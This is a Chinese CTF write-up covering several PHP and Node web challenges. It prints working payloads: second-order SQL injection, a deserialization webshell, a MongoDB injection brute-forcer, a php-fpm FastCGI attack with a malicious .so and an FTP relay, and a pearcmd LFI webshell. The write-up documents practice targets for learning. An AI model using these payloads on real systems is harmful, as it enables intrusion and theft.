![image-20230126163830638](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301261638713.png)

## [XDCTF 2015]filemanager

`www.tar.gz` 源码泄露, 下面只贴关键代码

common.inc.php

```php
<?php

$DATABASE = array(

	"host" => "127.0.0.1",
	"username" => "root",
	"password" => "ayshbdfuybwayfgby",
	"dbname" => "xdctf",
);

$db = new mysqli($DATABASE['host'], $DATABASE['username'], $DATABASE['password'], $DATABASE['dbname']);
$req = array();

foreach (array($_GET, $_POST, $_COOKIE) as $global_var) {
	foreach ($global_var as $key => $value) {
		is_string($value) && $req[$key] = addslashes($value);
	}
}

define("UPLOAD_DIR", "upload/");

function redirect($location) {
	header("Location: {$location}");
	exit;
}
```

upload.php

```php
<?php
    
require_once "common.inc.php";

if ($_FILES) {
	$file = $_FILES["upfile"];
	if ($file["error"] == UPLOAD_ERR_OK) {
		$name = basename($file["name"]);
		$path_parts = pathinfo($name);

		if (!in_array($path_parts["extension"], array("gif", "jpg", "png", "zip", "txt"))) {
			exit("error extension");
		}
		$path_parts["extension"] = "." . $path_parts["extension"];

		$name = $path_parts["filename"] . $path_parts["extension"];

		// $path_parts["filename"] = $db->quote($path_parts["filename"]);
		// Fix
		$path_parts['filename'] = addslashes($path_parts['filename']);

		$sql = "select * from `file` where `filename`='{$path_parts['filename']}' and `extension`='{$path_parts['extension']}'";

		$fetch = $db->query($sql);

		if ($fetch->num_rows > 0) {
			exit("file is exists");
		}

		if (move_uploaded_file($file["tmp_name"], UPLOAD_DIR . $name)) {

			$sql = "insert into `file` ( `filename`, `view`, `extension`) values( '{$path_parts['filename']}', 0, '{$path_parts['extension']}')";
			$re = $db->query($sql);
			if (!$re) {
				print_r($db->error);
				exit;
			}
			$url = "/" . UPLOAD_DIR . $name;
			echo "Your file is upload, url:
                <a href=\"{$url}\" target='_blank'>{$url}</a><br/>
                <a href=\"/\">go back</a>";
		} else {
			exit("upload error");
		}

	} else {
		print_r(error_get_last());
		exit;
	}
}
```

rename.php

```php
<?php

require_once "common.inc.php";

if (isset($req['oldname']) && isset($req['newname'])) {
	$result = $db->query("select * from `file` where `filename`='{$req['oldname']}'");
	if ($result->num_rows > 0) {
		$result = $result->fetch_assoc();
	} else {
		exit("old file doesn't exists!");
	}

	if ($result) {

		$req['newname'] = basename($req['newname']);
		$re = $db->query("update `file` set `filename`='{$req['newname']}', `oldname`='{$result['filename']}' where `fid`={$result['fid']}");
		if (!$re) {
			print_r($db->error);
			exit;
		}
		$oldname = UPLOAD_DIR . $result["filename"] . $result["extension"];
		$newname = UPLOAD_DIR . $req["newname"] . $result["extension"];
		if (file_exists($oldname)) {
			rename($oldname, $newname);
		}
		$url = "/" . $newname;
		echo "Your file is rename, url:
                <a href=\"{$url}\" target='_blank'>{$url}</a><br/>
                <a href=\"/\">go back</a>";
	}
}
?>
```

rename.php 里面有一句很明显存在二次注入

```php
$db->query("update `file` set `filename`='{$req['newname']}', `oldname`='{$result['filename']}' where `fid`={$result['fid']}");
```

注入点 `$result['filename']` 对应着上传时去除后缀的文件名

思路是利用二次注入重命名图片为 php 后缀

但这里有一个问题, 上面代码中的 `$oldname` 后缀是从上一次的查询中取出的, 一旦修改了 extension 之后就会出现 `$oldname` 与实际已经上传的 filename 不对应的情况, 所以需要连带着 filename 字段也给改一下

payload

```
1',`filename`='1.jpg',`extension`=''#.jpg

oldname=1',`filename`='1.jpg',`extension`=''#&newname=1

oldname=1.jpg&newname=1.php
```

第一行是上传文件的 filename, 后面两行是在上传之后提交给 rename.php 的参数

![image-20230126183542618](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301261835746.png)

![image-20230126183603862](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301261836964.png)

![image-20230126183613240](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301261836335.png)

![image-20230126183703788](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301261837878.png)

## [羊城杯 2020]EasySer

```
http://52a0f5af-085b-43d9-b812-4175ce0815e3.node4.buuoj.cn:81/index.php
http://52a0f5af-085b-43d9-b812-4175ce0815e3.node4.buuoj.cn:81/robots.txt
http://52a0f5af-085b-43d9-b812-4175ce0815e3.node4.buuoj.cn:81/star1.php
http://52a0f5af-085b-43d9-b812-4175ce0815e3.node4.buuoj.cn:81/star1.php?path=http://127.0.0.1/ser.php
```

ser.php

```php
<?php
error_reporting(0);
if ( $_SERVER['REMOTE_ADDR'] == "127.0.0.1" ) {
    highlight_file(__FILE__);
} 
$flag='{Trump_:"fake_news!"}';

class GWHT{
    public $hero;
    public function __construct(){
        $this->hero = new Yasuo;
    }
    public function __toString(){
        if (isset($this->hero)){
            return $this->hero->hasaki();
        }else{
            return "You don't look very happy";
        }
    }
}
class Yongen{ //flag.php
    public $file;
    public $text;
    public function __construct($file='',$text='') {
        $this -> file = $file;
        $this -> text = $text;
        
    }
    public function hasaki(){
        $d   = '<?php die("nononon");?>';
        $a= $d. $this->text;
         @file_put_contents($this-> file,$a);
    }
}
class Yasuo{
    public function hasaki(){
        return "I'm the best happy windy man";
    }
}

?>
```

payload

```php
<?php

class GWHT{
    public $hero;

    public function __toString(){
        if (isset($this->hero)){
            return $this->hero->hasaki();
        }else{
            return "You don't look very happy";
        }
    }
}
class Yongen{ //flag.php
    public $file;
    public $text;

    public function hasaki(){
        $d   = '<?php die("nononon");?>';
        $a= $d. $this->text;
         @file_put_contents($this-> file,$a);
    }
}

$b = new Yongen();
$b->file = "php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php";
$b->text = base64_encode('<?php eval($_REQUEST[1]);?>');

$a = new GWHT();
$a->hero = $b;

echo urlencode(serialize($a));

?>
```

参数找了大半天, 看 wp 才发现是 `c`

```
http://52a0f5af-085b-43d9-b812-4175ce0815e3.node4.buuoj.cn:81/star1.php?path=http://127.0.0.1/&c=O%3A4%3A%22GWHT%22%3A1%3A%7Bs%3A4%3A%22hero%22%3BO%3A6%3A%22Yongen%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A77%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dstring.strip_tags%7Cconvert.base64-decode%2Fresource%3Dshell.php%22%3Bs%3A4%3A%22text%22%3Bs%3A36%3A%22PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOz8%2B%22%3B%7D%7D
```

```
http://52a0f5af-085b-43d9-b812-4175ce0815e3.node4.buuoj.cn:81/shell.php?1=system('cat /ffflag');
```

翻了下原题 ser.php 末尾是有注释的, 不知道什么情况

```php
/*$c=$_GET['c'];
echo $x=unserialize($c);*/
```

## [2021祥云杯]Package Manager 2021

有 csp + bot + report to admin 页面, 一开始猜测是 xss

```
Content-Security-Policy: default-src 'none';style-src 'self' 'sha256-GQNllb5OTXNDw4L6IIESVZXrXdsfSA9O8LeoDwmVQmc=';img-src 'self';form-action 'self';base-uri 'none';
```

然后这个 csp 死活绕不过

最后发现其实是 mongodb 注入

/routes/index.ts

```javascript
......
router.post('/auth', async (req, res) => {
	let { token } = req.body;
	if (token !== '' && typeof (token) === 'string') {
		if (checkmd5Regex(token)) {
			try {
				let docs = await User.$where(`this.username == "admin" && hex_md5(this.password) == "${token.toString()}"`).exec()
				console.log(docs);
				if (docs.length == 1) {
					if (!(docs[0].isAdmin === true)) {
						return res.render('auth', { error: 'Failed to auth' })
					}
				} else {
					return res.render('auth', { error: 'No matching results' })
				}
			} catch (err) {
				return res.render('auth', { error: err })
			}
		} else {
			return res.render('auth', { error: 'Token must be valid md5 string' })
		}
	} else {
		return res.render('auth', { error: 'Parameters error' })
	}
	req.session.AccessGranted = true
	res.redirect('/packages/submit')
});
......
```

/utils.ts

```javascript
......
const checkmd5Regex = (token: string) => {
  return /([a-f\d]{32}|[A-F\d]{32})/.exec(token);
}
......
```

有一个名字是 flag 的 package, 但只有 admin 才能查看

/auth 路由会验证 token, 其实就是 md5 加密后的 password, 但是因为 checkmd5Regex 这个函数在匹配 md5 格式的时候没有加上 `^` `$` 限定开头和结尾, 所以导致随便输入一串符合条件的字符串, 再加上自定义的 mongodb 语句就可以绕过限制产生注入

参考文章: [https://forum.butian.net/share/474](https://forum.butian.net/share/474)

payload

```javascript
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" ^ 0 ^ "

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" ^ this.password[0]=="xxx" ^ "
```

```python
import requests
import time
import json
import re
from urllib.parse import quote

flag = ''

for i in range(99999):
    for s in range(32, 127):
        time.sleep(0.02)
        print(chr(s))
        url = 'http://2cafdae6-2166-4617-9aea-ef75772f5d47.node4.buuoj.cn:81/auth'
        if chr(s) == '\\' or chr(s) == '"':
            payload = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" ^ this.password[{}]=="{}" ^ "'.format(i, '\\' + chr(s))
        else:
            payload = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" ^ this.password[{}]=="{}" ^ "'.format(i, chr(s))
        data = {
            '_csrf': 'OEnroHPF-czkmcP9BmJAhkp306-LRMDKWRSA',
            'token': payload
        }
        cookies = {'session': 's%3AI4rcQHje8htnOu1zrBMCCEkq5pqbmJ0D.ouGFBMeRcqwu7LXLcDxzfpm%2B385Ik6JLkl4jEVfY4Rs'}
        res = requests.post(url, data=data, cookies=cookies, allow_redirects=False)
        if res.status_code == 302:
            flag += chr(s)
            print('found!!!', flag)
            break
```

跑出来密码为 `!@#&@&@efefef*@((@))grgregret3r`

![image-20230127171308673](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301271713809.png)

看 wp 发现一种报错注入的方式

```javascript
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" ^ (()=>{throw Error(this.password)})() ^ "
```

还有一种 xsleaks 的解法

[https://www.scuctf.com/ctfwiki/web/9.xss/xsleaks/](https://www.scuctf.com/ctfwiki/web/9.xss/xsleaks/)

## [蓝帽杯 2021]One Pointer PHP

user.php

```php
<?php
class User{
	public $count = '9223372036854775806';
}
?>
```

add\_api.php

```php
<?php
include "user.php";
if($user=unserialize($_COOKIE["data"])){
	$count[++$user->count]=1;
	if($count[]=1){
		$user->count+=1;
		setcookie("data",serialize($user));
	}else{
		eval($_GET["backdoor"]);
	}
}else{
	$user=new User;
	$user->count=1;
	setcookie("data",serialize($user));
}
?>
```

关键在于使 `$count[]=1` 报错, 从而进入 else 块执行 eval 后门

查了一圈发现考点是 php 数组溢出, 其实本质上是个 bug (?)

[https://www.php.net/manual/zh/language.types.integer.php](https://www.php.net/manual/zh/language.types.integer.php)

[https://stackoverflow.com/questions/18286066/next-element-is-already-occupied-error](https://stackoverflow.com/questions/18286066/next-element-is-already-occupied-error)

[https://bugs.php.net/bug.php?id=47836](https://bugs.php.net/bug.php?id=47836)

[https://github.com/php/php-src/tree/PHP-7.2.10/Zend/tests/bug47836.phpt](https://github.com/php/php-src/tree/PHP-7.2.10/Zend/tests/bug47836.phpt)

```
--TEST--
Bug #47836 (array operator [] inconsistency when the array has PHP_INT_MAX index value)
--FILE--
<?php

$arr[PHP_INT_MAX] = 1;
$arr[] = 2;

var_dump($arr);
?>
--EXPECTF--
Warning: Cannot add element to the array as the next element is already occupied in %s on line 4
array(1) {
  [%d]=>
  int(1)
}
```

payload

```php
<?php
class User{
	public $count = '9223372036854775806';
}

echo urlencode(serialize(new User()));
?>
```

shell 连上去发现 `disable_functions` 禁止了一堆, 而且 `open_basedir` 也有限制

利用蚁剑的 `PHP7_UserFilter` bypass

![image-20230127213932178](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301272139255.png)

![image-20230127213840057](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301272138128.png)

suid

![image-20230127213944116](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301272139150.png)

直接运行会使用默认的 php.ini (包含 `disable_functions` 和 `open_basedir` 限制), 所以这里指定 `-n` 参数让它不依赖任何 ini 配置文件运行

```bash
php -r "echo file_get_contents('/flag');" -n
```

![image-20230127213959802](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301272139843.png)

然后看 wp 的时候发现还是非预期了 (躺)

预期解是攻击 php-fpm 绕过 `disable_functions`, 利用 `ini_set()` 绕过 `open_basedir`

后者好像在 buu 的环境下没有起到任何作用....

参考文章如下

[https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html)

[https://tttang.com/archive/1775](https://tttang.com/archive/1775)

[https://www.php.net/manual/zh/install.fpm.configuration.php](https://www.php.net/manual/zh/install.fpm.configuration.php)

[https://www.php.net/manual/zh/ini.core.php](https://www.php.net/manual/zh/ini.core.php)

因为 `file_get_contents()` 不支持 gopher 协议, 而且 fsocksopen 被禁用了, curl 扩展甚至都没安装, 所以只能利用 ftp 被动模式配合它来转发 fastcgi 数据包

翻一下 nginx 配置文件得到 php-fpm 地址为 `127.0.0.1:9001`

稍微改一下 p 牛的脚本

```python
import socket
import random
import sys
from io import BytesIO
from six.moves.urllib import parse as urlparse

# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client

PY2 = True if sys.version_info.major == 2 else False


def bchr(i):
    if PY2:
        return force_bytes(chr(i))
    else:
        return bytes([i])

def bord(c):
    if isinstance(c, int):
        return c
    else:
        return ord(c)

def force_bytes(s):
    if isinstance(s, bytes):
        return s
    else:
        return s.encode('utf-8', 'strict')

def force_text(s):
    if issubclass(type(s), str):
        return s
    if isinstance(s, bytes):
        s = str(s, 'utf-8', 'strict')
    else:
        s = str(s)
    return s


class FastCGIClient:
    """A Fast-CGI Client for Python"""

    # private
    __FCGI_VERSION = 1

    __FCGI_ROLE_RESPONDER = 1
    __FCGI_ROLE_AUTHORIZER = 2
    __FCGI_ROLE_FILTER = 3

    __FCGI_TYPE_BEGIN = 1
    __FCGI_TYPE_ABORT = 2
    __FCGI_TYPE_END = 3
    __FCGI_TYPE_PARAMS = 4
    __FCGI_TYPE_STDIN = 5
    __FCGI_TYPE_STDOUT = 6
    __FCGI_TYPE_STDERR = 7
    __FCGI_TYPE_DATA = 8
    __FCGI_TYPE_GETVALUES = 9
    __FCGI_TYPE_GETVALUES_RESULT = 10
    __FCGI_TYPE_UNKOWNTYPE = 11

    __FCGI_HEADER_SIZE = 8

    # request state
    FCGI_STATE_SEND = 1
    FCGI_STATE_ERROR = 2
    FCGI_STATE_SUCCESS = 3

    def __init__(self, host, port, timeout, keepalive):
        self.host = host
        self.port = port
        self.timeout = timeout
        if keepalive:
            self.keepalive = 1
        else:
            self.keepalive = 0
        self.sock = None
        self.requests = dict()

    def __connect(self):
        # self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # self.sock.settimeout(self.timeout)
        # self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # # if self.keepalive:
        # #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
        # # else:
        # #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
        # try:
        #     self.sock.connect((self.host, int(self.port)))
        # except socket.error as msg:
        #     self.sock.close()
        #     self.sock = None
        #     print(repr(msg))
        #     return False
        return True

    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
        length = len(content)
        buf = bchr(FastCGIClient.__FCGI_VERSION) \
               + bchr(fcgi_type) \
               + bchr((requestid >> 8) & 0xFF) \
               + bchr(requestid & 0xFF) \
               + bchr((length >> 8) & 0xFF) \
               + bchr(length & 0xFF) \
               + bchr(0) \
               + bchr(0) \
               + content
        return buf

    def __encodeNameValueParams(self, name, value):
        nLen = len(name)
        vLen = len(value)
        record = b''
        if nLen < 128:
            record += bchr(nLen)
        else:
            record += bchr((nLen >> 24) | 0x80) \
                      + bchr((nLen >> 16) & 0xFF) \
                      + bchr((nLen >> 8) & 0xFF) \
                      + bchr(nLen & 0xFF)
        if vLen < 128:
            record += bchr(vLen)
        else:
            record += bchr((vLen >> 24) | 0x80) \
                      + bchr((vLen >> 16) & 0xFF) \
                      + bchr((vLen >> 8) & 0xFF) \
                      + bchr(vLen & 0xFF)
        return record + name + value

    def __decodeFastCGIHeader(self, stream):
        header = dict()
        header['version'] = bord(stream[0])
        header['type'] = bord(stream[1])
        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])
        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])
        header['paddingLength'] = bord(stream[6])
        header['reserved'] = bord(stream[7])
        return header

    def __decodeFastCGIRecord(self, buffer):
        header = buffer.read(int(self.__FCGI_HEADER_SIZE))

        if not header:
            return False
        else:
            record = self.__decodeFastCGIHeader(header)
            record['content'] = b''
            
            if 'contentLength' in record.keys():
                contentLength = int(record['contentLength'])
                record['content'] += buffer.read(contentLength)
            if 'paddingLength' in record.keys():
                skiped = buffer.read(int(record['paddingLength']))
            return record

    def request(self, nameValuePairs={}, post=''):
        if not self.__connect():
            print('connect failure! please check your fasctcgi-server !!')
            return

        requestId = random.randint(1, (1 << 16) - 1)
        self.requests[requestId] = dict()
        request = b""
        beginFCGIRecordContent = bchr(0) \
                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
                                 + bchr(self.keepalive) \
                                 + bchr(0) * 5
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                              beginFCGIRecordContent, requestId)
        paramsRecord = b''
        if nameValuePairs:
            for (name, value) in nameValuePairs.items():
                name = force_bytes(name)
                value = force_bytes(value)
                paramsRecord += self.__encodeNameValueParams(name, value)

        if paramsRecord:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)

        if post:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)

        # self.sock.send(request)
        # self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND
        # self.requests[requestId]['response'] = b''
        # return self.__waitForResponse(requestId)
        return request

    def __waitForResponse(self, requestId):
        data = b''
        while True:
            buf = self.sock.recv(512)
            if not len(buf):
                break
            data += buf

        data = BytesIO(data)
        while True:
            response = self.__decodeFastCGIRecord(data)
            if not response:
                break
            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \
                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR
                if requestId == int(response['requestId']):
                    self.requests[requestId]['response'] += response['content']
            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:
                self.requests[requestId]
        return self.requests[requestId]['response']

    def __repr__(self):
        return "fastcgi connect host:{} port:{}".format(self.host, self.port)


if __name__ == '__main__':

    host = '127.0.0.1'
    port = 9001

    client = FastCGIClient(host, port, 3, 0)
    params = dict()
    documentRoot = "/"
    uri = '/var/www/html/user.php'
    content = '<?php phpinfo();?>'
    params = {
        'GATEWAY_INTERFACE': 'FastCGI/1.0',
        'REQUEST_METHOD': 'POST',
        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
        'SCRIPT_NAME': uri,
        'QUERY_STRING': '',
        'REQUEST_URI': uri,
        'DOCUMENT_ROOT': documentRoot,
        'SERVER_SOFTWARE': 'php/fcgiclient',
        'REMOTE_ADDR': '127.0.0.1',
        'REMOTE_PORT': '9985',
        'SERVER_ADDR': '127.0.0.1',
        'SERVER_PORT': '80',
        'SERVER_NAME': "localhost",
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'CONTENT_TYPE': 'application/text',
        'CONTENT_LENGTH': "%d" % len(content),
        'PHP_VALUE': 'auto_prepend_file = php://input',
        'PHP_ADMIN_VALUE': 'allow_url_include = On\nextension = /var/www/html/evil.so'
    }
    request_ssrf = urlparse.quote(client.request(params, content))
    print(force_text("gopher://" + host + ":" + str(port) + "/_" + request_ssrf))
```

关键在于 `PHP_VALUE` 和 `PHP_ADMIN_VALUE`, 利用这两个参数就可以更改绝大部分的 php 环境变量

查了下文档发现 `extension` 参数的可修改范围是 ` php.ini only`, 但是实际上也能够通过 `PHP_ADMIN_VALUE` 修改

但是它们仍然是不能修改 `disable_functions` 的, 也就是不能覆盖之前在 `php.ini` 中设置的值, 只能 append

![image-20230128164011633](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301281640704.png)

上面利用 `extension` 参数指定要加载的恶意 so, 其中 so 源码如下

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

__attribute__ ((__constructor__)) void preload (void){
    system("php -r \"echo file_put_contents('/var/www/html/flag.txt',file_get_contents('/flag'));\" -n");
}

// gcc -fPIC -shared evil.c -o evil.so
```

其实跟 `LD_PRELOAD` 的利用代码差不多, 原理都是利用 `__attribute__ ((__constructor__))` 修饰符使函数先于 main 执行 (类似构造函数)

ftp 被动模式脚本

```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.bind(('0.0.0.0', 23))
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 welcome\n')
#Service ready for new user.
#Client send anonymous username
#USER anonymous
conn.send(b'331 Please specify the password.\n')
#User name okay, need password.
#Client send anonymous password.
#PASS anonymous
conn.send(b'230 Login successful.\n')
#User logged in, proceed. Logged out if appropriate.
#TYPE I
conn.send(b'200 Switching to Binary mode.\n')
#Size /
conn.send(b'550 Could not get the file size.\n')
#EPSV (1)
conn.send(b'150 ok\n')
#PASV
conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n') #STOR / (2)
conn.send(b'150 Permission denied.\n')
#QUIT
conn.send(b'221 Goodbye.\n')
conn.close()
```

最后用 `file_get_contents()` 触发 ftp 连接

```php
<?php

var_dump(file_put_contents("ftp://x.x.x.x:23/test.txt", urldecode("%01%01%82k%00%08%00%00%00%01%00%00%00%00%00%00%01%04%82k%01%FA%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%16SCRIPT_FILENAME/var/www/html/user.php%0B%16SCRIPT_NAME/var/www/html/user.php%0C%00QUERY_STRING%0B%16REQUEST_URI/var/www/html/user.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH18%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F8PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aextension%20%3D%20/var/www/html/evil.so%01%04%82k%00%00%00%00%01%05%82k%00%12%00%00%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%01%05%82k%00%00%00%00")));
```

![image-20230128164631779](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301281646853.png)

## Wallbreaker_Easy

emmm 蚁剑 bypass 插件可以直接秒

预期解是 `LD_PRELOAD` 配合 Imagick 启动新进程来执行命令, 非预期解是 `error_log()`

就不写了

## [HXBCTF 2021]easywill

```php
<?php
namespace home\controller;
class IndexController{
    public function index(){
        highlight_file(__FILE__);
        assign($_GET['name'],$_GET['value']);
        return view();
    }
}
```

WillPHP v2.1.5

去看了下 gitee 发现作者竟然把之前的旧版本都删了, 只留下了最新的 v3 版本, 也是离谱

后来用百度找了一个下载站总算是弄到了源码

跟进 assign 方法

![image-20230128200702911](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301282007055.png)

![image-20230128200744661](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301282007784.png)

跟进 render

![image-20230128200825756](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301282008873.png)

很明显的变量覆盖, 配合底下的 include 实现任意文件包含

`allow_url_include` 没开, 先试一下 pearcmd

```
/index.php?name=cfile&value=/usr/local/lib/php/pearcmd.php&+config-create+/<?=eval($_REQUEST[1]);?>+/tmp/hello.php 
```

![image-20230128200934211](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301282009300.png)

![image-20230128201008478](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301282010571.png)
